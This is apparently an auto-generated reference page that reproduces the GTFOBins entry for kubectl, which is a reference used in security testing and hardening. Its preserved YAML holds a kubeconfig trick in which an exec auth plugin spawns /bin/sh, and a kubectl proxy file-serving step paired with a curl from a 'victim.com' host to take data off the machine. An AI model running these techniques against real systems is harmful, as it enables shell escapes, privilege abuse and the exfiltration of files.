---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# kubectl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `kubectl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/kubectl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [kubectl](../../tools/linux/kubectl.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | kubectl |
| name | kubectl |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/kubectl/ |

## Preserved Source Material

```yaml
_body: ''
_name: kubectl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/kubectl
functions:
  shell:
  - code: "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\ncontexts:\n- context:\n\
      \    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name: x\n  user:\n    exec:\n      apiVersion:\
      \ client.authentication.k8s.io/v1\n      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n\
      \        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/path/to/temp-file"
    comment: The shell is spawn multiple times.
    contexts:
      sudo: null
      unprivileged: null
  upload:
  - code: kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver:
      code: curl victim.com:12345/x/path/to/input-file -o /path/to/output-file
      comment: An HTTP client can be used on the attacker box to receive the data.
```
